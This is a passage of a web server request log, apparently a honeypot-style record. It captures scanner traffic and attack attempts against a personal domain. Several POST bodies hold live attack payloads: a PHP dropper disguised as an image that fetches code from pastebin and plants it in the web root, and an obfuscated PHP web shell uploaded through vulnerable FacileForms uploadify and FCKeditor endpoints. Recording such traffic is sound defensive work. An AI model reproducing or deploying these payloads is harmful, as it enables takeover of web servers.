+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "1252"
+}
+::ffff:46.105.99.212
+{}
+{"--65e63355223f37dd8957e3478ef2c389\r\nContent-Disposition: form-data; name":"\"name\"\r\n\r\nvuln.php\r\n--65e63355223f37dd8957e3478ef2c389\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload\r\n--65e63355223f37dd8957e3478ef2c389\r\nContent-Disposition: form-data; name=\"file\"; filename=\"index.jpg\"\r\n\r\n<title>Vuln!! patch it Now!</title>\r\n<?php\r\nfunction http_get($url){\r\n\t$im = curl_init($url);\r\n\tcurl_setopt($im, CURLOPT_RETURNTRANSFER, 1);\r\n\tcurl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);\r\n\tcurl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);\r\n\tcurl_setopt($im, CURLOPT_HEADER, 0);\r\n\treturn curl_exec($im);\r\n\tcurl_close($im);\r\n}\r\n$check = $_SERVER['DOCUMENT_ROOT'] . \"/images/vuln.php\" ;\r\n$text = http_get('https://pastebin.com/raw/phAM8DFH');\r\n$open = fopen($check, 'w');\r\nfwrite($open, $text);\r\nfclose($open);\r\nif(file_exists($check)){\r\n    echo $check.\"</br>\";\r\n}else \r\n  echo \"not exits\";\r\necho \"done .\\n \" ;\r\n\r\n$check2 = $_SERVER['DOCUMENT_ROOT'] . \"/vuln.htm\" ;\r\n$text2 = http_get('https://pastebin.com/raw/880ufaWF');\r\n$open2 = fopen($check2, 'w');\r\nfwrite($open2, $text2);\r\nfclose($open2);\r\nif(file_exists($check2)){\r\n    echo $check2.\"</br>\";\r\n}else \r\n  echo \"not exits\";\r\necho \"done .\\n \" ;\r\n\r\n@unlink(__FILE__);\r\n?>\r\n\r\n--65e63355223f37dd8957e3478ef2c389--\r\n"}
+**END SECURE REQUEST
+========= REQ #124==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/components/com_facileforms/libraries/jquery/uploadify.php
+2019:08:01:12:00:30
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #125==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/components/com_facileforms/libraries/jquery/uploadify.php
+2019:08:01:12:00:36
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "2466"
+}
+::ffff:46.105.99.212
+{}
+{"--f06c10bbf3f9838314f6d26211c847df\r\nContent-Disposition: form-data; name=\"folder\"\r\n\r\n/components/com_facileforms/libraries/jquery/\r\n--f06c10bbf3f9838314f6d26211c847df\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"up.php\"\r\n\r\n<title>Vuln!! patch it Now!</title><?php error_reporting(0);$sr=\"st\"./* /* */\"rr\"/* /* */.\"ev\";$id=$sr/* /* */(\"ri\".\"d_\".\"si\");$rn=$sr/* /* */(\"em\".\"an\".\"er\");$dn=$sr/* /* */(\"em\".\"anr\".\"id\");$od=$sr/* /* */(\"ri\".\"dne\".\"po\");$rd=$sr/* /* */(\"ri\".\"dda\".\"er\");$cd=$sr/* /* */(\"ri\".\"deso\".\"lc\");$fpc=$sr/* /* */(\"stn\".\"etn\".\"oc_t\".\"up_e\".\"lif\");$fgc=$sr/* /* */(\"stn\".\"etn\".\"oc_t\".\"eg_e\".\"lif\");$muf=$sr/* /* */(\"eli\".\"f_d\".\"eda\".\"olp\".\"u_e\".\"vom\");$dlform='<form method=\"post\">FN:<input name=\"fn\" size=\"20\" type=\"text\">URL:<input name=\"url\" size=\"50\" type=\"text\"><input type=\"submit\" value=\"ok\"></form>';$ulform='<form method=\"post\" enctype=\"multipart/form-data\"><input name=\"uf\" type=\"file\">SP:<input name=\"sp\" size=\"50\" type=\"text\"><input type=\"submit\" value=\"ok\"></form>';$rnform='<form method=\"post\">ON:<input name=\"on\" size=\"50\" type=\"text\">NN:<input name=\"nn\" size=\"50\" type=\"text\"><input type=\"submit\" value=\"ok\"></form>';$lpform='<form method=\"post\">DP:<input name=\"dp\" size=\"50\" type=\"text\"><input type=\"submit\" value=\"ok\"></form>';$sfform='<form method=\"post\">DF:<input name=\"df\" size=\"50\" type=\"text\"><input type=\"submit\" value=\"ok\"></form>';if($_GET":{"'act'":"='dl'){echo($dlform);if($_SERVER['REQUEST_METHOD']=='POST'){$fpc/* /* */($_POST['fn'],$fgc/* /* */($_POST['url']));}exit;}if($_GET['act']=='ul'){echo($ulform);if($_SERVER['REQUEST_METHOD']=='POST'){$sp=empty($_POST['sp'])?'./':$_POST['sp'].'/';$muf/* /* */($/* /* */{\"_F\".\"IL\".\"ES\"}[\"uf\"][\"tmp_name\"],$sp.$/* /* */{\"_F\".\"IL\".\"ES\"}[\"uf\"][\"name\"]);}exit;}if($_GET['act']=='rn'){echo($rnform);if($_SERVER['REQUEST_METHOD']=='POST'){$rn/* /* */($_POST['on'],$_POST['nn']);}exit;}if($_GET['act']=='gp'){echo($dn/* /* */(__FILE__));exit;}if($_GET['act']=='lp'){echo($lpform);if($_SERVER['REQUEST_METHOD']=='POST'){$dp=$_POST['dp'].'/';$h=$od/* /* */($dp);while(($fn=$rd/* /* */($h))!==false){if($id/* /* */($dp.$fn)){$t1.='D"},"nbsp;'.$fn.'<br>';}else{$t2.":"'","nbsp;":"","nbsp;'.$fn.'<br>';}}$cd/* /* */($dp);echo($dp.'<br>'.$t1.$t2);}exit;}if($_GET":{"'act'":"='sf'){echo($sfform);if($_SERVER['REQUEST_METHOD']=='POST'){$df=$_POST['df'];echo('<textarea style=\"width:100%;height:100%;\" wrap=\"off\">'.$fgc/*+/*+*/($df).'</textarea>');}exit;}?>\r\n--f06c10bbf3f9838314f6d26211c847df--\r\n"}}
+**END SECURE REQUEST
+========= REQ #126==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/components/com_facileforms/libraries/jquery/up.php
+2019:08:01:12:00:42
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #127==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/components/com_facileforms/libraries/jquery/uploadify.php
+2019:08:01:12:00:49
+POST
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5",
+  "content-length": "2744"
+}
+::ffff:46.105.99.212
+{}
+{"--740ebb81f96f712ba3124136e1eb9ba4\r\nContent-Disposition: form-data; name":"\"folder\"\r\n\r\n/components/com_facileforms/libraries/jquery/\r\n--740ebb81f96f712ba3124136e1eb9ba4\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"pwn.gif\"\r\n\r\nGIF89a\u0018\u0001G\u0000p\u0000\u0000!�\u0004\u0001\u0000\u0000�\u0000,\u0000\u0000\u0000\u0000\u0018\u0001G\u0000�\u0000\u0000\u0000\u0000\u00003\u0000\u0000f\u0000\u0000�\u0000\u0000�\u0000\u0000�\u0000 \u0000\u0000 3\u0000 f\u0000 �\u0000 �\u0000 �\u0000U\u0000\u0000U3\u0000Uf\u0000U�\u0000U�\u0000U�\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000ՙ\u0000��\u0000��\u0000�\u0000\u0000�3\u0000�f\u0000��\u0000��\u0000��3\u0000\u00003\u000033\u0000f3\u0000�3\u0000�3\u0000�3 \u00003 33 f3 �3 �3 �3U\u00003U33Uf3U�3U�3U�3�\u00003�33�f3��3��3��3�\u00003�33�f3��3��3��3�\u00003�33�f3ՙ3��3��3�\u00003�33�f3��3��3��f\u0000\u0000f\u00003f\u0000ff\u0000�f\u0000�f\u0000�f \u0000f 3f ff �f �f �fU\u0000fU3fUffU�fU�fU�f�\u0000f�3f�ff��f��f��f�\u0000f�3f�ff��f��f��f�\u0000f�3f�ffՙf��f��f�\u0000f�3f�ff��f��f���\u0000\u0000�\u00003�\u0000f�\u0000��\u0000̙\u0000�� \u0000� 3� f� �� ̙ ��U\u0000�U3�Uf�U��U̙U���\u0000��3��f�����̙����\u0000��3��f�����̙����\u0000��3��f�ՙ��̙����\u0000��3��f�����̙���\u0000\u0000�\u00003�\u0000f�\u0000��\u0000��\u0000�� \u0000� 3� f� �� �� ��U\u0000�U3�Uf�U��U��U�̀\u0000̀3̀f̀�̀�̀�̪\u0000̪3̪f̪�̪�̪���\u0000��3��f�ՙ��������\u0000��3��f����������\u0000\u0000�\u00003�\u0000f�\u0000��\u0000��\u0000�� \u0000� 3� f� �� �� ��U\u0000�U3�Uf�U��U��U���\u0000��3��f�����������\u0000��3��f�����������\u0000��3��f�ՙ��������\u0000��3��f���������\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\b�\u0000\u0001\b\u001cH����\b\u0013*\\Ȱ�Ç\u0010#J�H��ŋ\u00183j�ȱ�Ǐ C�\u001cI��ɓ(S�\\ɲ�˗0cʜI��͛8s��ɳ�ϟ@�\n\u001dJ��ѣH�*]ʴ�ӧP�J�J��իX�j�ʵ�ׯ`Ê\u001dK��ٳhӪ]˶�۷p�ʝK��\u0003e��\u0002\u0011�Bk\u0000P�\u0006�\r�2�\"��\u0013\u0002Qv�a\u000ee� \"\u0000ELYeb���D�l����)>�����a�;\"��W���","\u001f'��q�2�\u0005\u001dT���\b1a\u0017m Ӕ���\u0001�0�(\u001b7�ǐ\u0013���q2l�G�E]p1oɔ\u001b\u0013�L�\f6C5� >H\u0006\\�_�\u0011�C$\u000fF����\u0015��,��\u0000ʘd�\u0011v��b^Kp\u0010\u0013\fF�}7�d�D�\u0010\u0010�\u0005�[j��\u0012Q�\u000b>�^\u0017q��h�e��\u000f�\t��k��\b�b�U�؁\u0000<���\b�\u0017�D�\u001d8Z�\u0010�\b�\u0000�(S�FB*�\u001ef\u0017\u001e�\u0018w\u001e\u0011\b��.-�\u000bB��n�\t���\u0003\u001d��@V\nV�@\u000f�x�\u0003�\t�":"","�\u000b��\u001d�m$gB�%#\u0006(x\u001d�\u0003qTT�Z����\u0018o\u0010\u001aw\u0019u�U�\f1�8h�\u0011\u00124�rh��%�j$#�@y��Xe�\"��2\u0012\u0012��{�]fb�LZ��^����_��U��A�\u0016�ꢻޕ�\u0016�\u0019�\u001dn�UV�{�,\u000b�b�":"F��\t\u00188�G�u�^q�\u0015�W��-��B���di94�,1��:�0i�:\u001c��*\u0003f��>جe�<�\f\u0015\u0001\u0014�(����_g��\n@��l��p\tKjи\u000b\u000b|\u0019��\u001a�e�@�G\u0010��M7��]N�\u0018���٣f��\u000b��ƶ�]{\u0000�%qA�e\u0012�u(�\u0011m\u0012�I���\nɔ�9WP�G\u0003@)�\u0003Q��c4\u000bT��\u0005�v䳭�'�0���\u0010�\u0005]�3B������}���(\u000bDi�еG\u001eowќ�Iw����@��,]�hb�ܝS�G��\u000f\u0012���\n,A�����T�Fޮ\u000b\"��y��7��\r�kEƸ�q��z��\u0001����\u0005�:m+\u0017.xGY�J91@\n�X����'o3\u0016��0�X�,m�w�oQS��A蕨ɍΗJ���\u0003_�\u0003�t9i�`�J}B�\u001b�_�h[[oƉ{��xE\u0012\u001d�{��\u0019z�z+\u000f�d'����\u000e�ڍCf����n ���@\u0012���.v�\u001b�\u001b�<��rY+�]�W�\u0000؁q\u0003y��\b\u0018�ݭ�5��Ɋ���=pap�Dc2w�]@�v�q\u0011��v�\u0011�vU\u001bH��sC<�L\u000byR\u001a�\nT��\u0001�T���ƣ�-\u0012do\u0004�Vw�7Abx1jĹ^�ا�#v,�-̎o�3�\u001by�zF�\u001d\u0000�`��,\"K�\u0012�H��#�lL\u001d3�t�S���o:nKPd\f��\f\u0012����\f\f\u001fCB\u0015�ʒ�A`\u001c�,\u0018\u001a\u0004��)ݚ*��؅�]T\u0010@\u001d8��eM","\u0019U�ÿ�\u0012\f\u0004|�rC$\u0014\u00117��\u0010B�4�[\by2Q$/\u0006�R�8Nr��\u001d\u0014e1�\u0006)�A��\u001ef�c�\"F�\u000eB��H\u0010Km4\u00168�ٶ�YF\u0012�i \u0005�g9�����I�0�6���`fg�1g�\u001c�5S��_��b�|��B�Gvpd\u0015-��P�\\\r�\u0000`�0>�":"","bt\u0013��t\u000e���%��P�":{"2�i4��\u0001�r��Ld��fQ��/�b����E�\n~\n�P2v\u00150�H���\u0012O�TE\f�M�\u0010�\f_\u000eV����\u0013�{\u0018�\u001ae�)��z�d#N�z�ca�D�y�Q�7��8t1_͔�@�\u0019\u0012\u0014\u001d1s�)��\u0012F�\u0013�ү�L�r�*�C�Q���h6e�(ah¡5B,\u001c\u0006f�T�.;(\"aA���":""}}
+**END SECURE REQUEST
+========= REQ #128==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/components/com_facileforms/libraries/jquery/pwn.gif
+2019:08:01:12:00:58
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #129==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media
+2019:08:01:12:01:10
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
+  "content-type": "application/x-www-form-urlencoded",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #130==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:02:07:05:28
+HEAD
+{
+  "host": "github.davidthats.me",
+  "referer": "https://www.netcraft.com/survey/",
+  "user-agent": "Mozilla/4.0 (compatible; Netcraft Web Server Survey)",
+  "connection": "close"
+}
+::ffff:167.99.122.64
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #131==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:02:07:23:04
+GET
+{
+  "host": "github.davidthats.me",
+  "referer": "https://www.netcraft.com/survey/",
+  "user-agent": "Mozilla/4.0 (compatible; Netcraft Web Server Survey)",
+  "connection": "close"
+}
+::ffff:167.99.122.64
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #132==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:02:07:32:29
+GET
+{
+  "host": "github.davidthats.me",
+  "referer": "https://www.netcraft.com/survey/",
+  "user-agent": "Mozilla/4.0 (compatible; Netcraft Web Server Survey)",
+  "connection": "close"
+}
+::ffff:167.99.122.64
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #133==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/index.htm
+2019:08:02:07:41:40
+GET
+{
+  "host": "github.davidthats.me",
+  "referer": "https://www.netcraft.com/survey/",
+  "user-agent": "Mozilla/4.0 (compatible; Netcraft Web Server Survey)",
+  "connection": "close"
+}
+::ffff:167.99.122.64
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #134==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:03:02:17:14
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+}
+::ffff:209.17.97.2
+{}
+{}
+**END SECURE REQUEST
+========= REQ #135==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:03:13:20:14
+GET
+{
+  "host": "github.davidthats.me",
+  "accept-charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
+  "user-agent": "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)",
+  "accept-encoding": "identity",
+  "accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+  "accept-language": "en-gb,en;q=0.5",
+  "connection": "close"
+}
+::ffff:167.99.125.192
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #136==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:03:13:20:20
+GET
+{
+  "host": "github.davidthats.me",
+  "accept-charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
+  "user-agent": "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)",
+  "accept-encoding": "identity",
+  "accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+  "accept-language": "en-gb,en;q=0.5",
+  "connection": "close"
+}
+::ffff:167.99.125.192
+{}
+{}
+**END SECURE REQUEST
+========= REQ #137==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:04:08:31:42
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "9FTSI2D3KQH12D7CSZT7 181726140014400021 607675840071487139 217305821337052290 494862694958486634 775081389052887760 942131550037878607 569908797219628716 931427745814233437 304224349959341948 619423853395689911 453216039164157043 78106243383001758 700634494471417040 917605708647995593 847568716501985041 201090220935245076 953089895002946279 906255419002024876 574507236637218443 309201333034320848 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #138==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:04:08:31:42
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "09H5I9NUWKK3A5DS 339176574885685282 569682343826158258 946639403949489340 887015787023825323 78282428132768807 504809471533525724 365389596242323368 932911740443492920 394514011851191277 410942925448259933 300399205350412192 519943234785611688 428069109963656692 489755004220846730 515733502872367801 660183586799522111 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #139==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:05:01:49:26
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "user-agent": "Mozilla/5.0 (X11; Linux x86_64) KHTML/5.60.0 (like Gecko) Konqueror/5 KIO/5.60",
+  "accept": "text/html, text/*;q=0.9, image/jpeg;q=0.9, image/png;q=0.9, image/*;q=0.9, */*;q=0.8",
+  "accept-encoding": "gzip, deflate, x-gzip, x-deflate",
+  "accept-charset": "utf-8,*;q=0.5",
+  "accept-language": "en-US,en;q=0.9"
+}
+::ffff:108.255.194.121
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #140==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:05:01:49:26
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "user-agent": "Mozilla/5.0 (X11; Linux x86_64) KHTML/5.60.0 (like Gecko) Konqueror/5 KIO/5.60",
+  "accept": "text/html, text/*;q=0.9, image/jpeg;q=0.9, image/png;q=0.9, image/*;q=0.9, */*;q=0.8",
+  "accept-encoding": "gzip, deflate, x-gzip, x-deflate",
+  "accept-charset": "utf-8,*;q=0.5",
+  "accept-language": "en-US,en;q=0.9"
+}
+::ffff:108.255.194.121
+{}
+{}
+**END SECURE REQUEST
+========= REQ #141==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:05:01:49:28
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "upgrade-insecure-requests": "1",
+  "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+  "accept-encoding": "gzip, deflate",
+  "accept-language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7"
+}
+::ffff:108.255.194.121
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #142==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:05:01:49:28
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "upgrade-insecure-requests": "1",
+  "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+  "accept-encoding": "gzip, deflate, br",
+  "accept-language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7"
+}
+::ffff:108.255.194.121
+{}
+{}
+**END SECURE REQUEST
+========= REQ #143==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:05:02:06:24
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "upgrade-insecure-requests": "1",
+  "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+  "accept-encoding": "gzip, deflate, br",
+  "accept-language": "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7"
+}
+::ffff:108.255.194.121
+{}
+{}
+**END SECURE REQUEST
+========= REQ #144==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:05:02:50:36
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "python-requests/2.18.4",
+  "accept-encoding": "gzip, deflate",
+  "accept": "*/*",
+  "connection": "keep-alive"
+}
+::ffff:68.183.65.104
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #145==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:05:02:50:37
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "python-requests/2.18.4",
+  "accept-encoding": "gzip, deflate",
+  "accept": "*/*",
+  "connection": "keep-alive"
+}
+::ffff:68.183.65.104
+{}
+{}
+**END SECURE REQUEST
+========= REQ #146==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/wp-login.php
+2019:08:05:15:45:08
+GET
+{
+  "accept-encoding": "identity",
+  "host": "github.davidthats.me",
+  "connection": "close",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
+}
+::ffff:46.105.99.212
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #147==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/wp-login.php
+2019:08:05:15:45:17
+GET
+{
+  "accept-encoding": "identity",
+  "host": "github.davidthats.me",
+  "connection": "close",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #148==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/robots.txt
+2019:08:05:15:45:34
+GET
+{
+  "accept-encoding": "identity",
+  "host": "github.davidthats.me",
+  "connection": "close",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
+}
+::ffff:46.105.99.212
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #149==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/robots.txt
+2019:08:05:15:45:42
+GET
+{
+  "accept-encoding": "identity",
+  "host": "github.davidthats.me",
+  "connection": "close",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
+}
+::ffff:46.105.99.212
+{}
+{}
+**END SECURE REQUEST
+========= REQ #150==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:05:19:37:43
+GET
+{
+  "host": "github.davidthats.me",
+  "upgrade-insecure-requests": "1",
+  "user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+  "accept-encoding": "gzip, deflate",
+  "accept-language": "en-US,en;q=0.9",
+  "x-rbt-scar": "10.249.13.3:29361909:1000"
+}
+::ffff:198.212.183.21
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #151==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:05:19:37:44
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "upgrade-insecure-requests": "1",
+  "user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+  "accept-encoding": "gzip, deflate, br",
+  "accept-language": "en-US,en;q=0.9"
+}
+::ffff:198.212.183.21
+{}
+{}
+**END SECURE REQUEST
+========= REQ #152==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:06:06:48:52
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)"
+}
+::ffff:167.99.121.131
+{}
+{}
+**END SECURE REQUEST
+========= REQ #153==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:08:22:48:52
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+}
+::ffff:209.17.97.66
+{}
+{}
+**END SECURE REQUEST
+========= REQ #154==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:13:06:03:56
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+}
+::ffff:209.17.97.26
+{}
+{}
+**END SECURE REQUEST
+========= REQ #155==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:08:13:10:04:33
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "JZ8XV2H9K0YHD81MT5 522068383043019294 162472416065289389 329633533869238571 714902049504932033 287707478989682900 480178965148246702 874683473768963700 591583263353765057 327264210116590958 277930392701191189 526848185582627264 163955158310712934 466841656271851770 586161038947562188 40904390788159540 524656173800321071 869055183150496547 218452899573155818 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
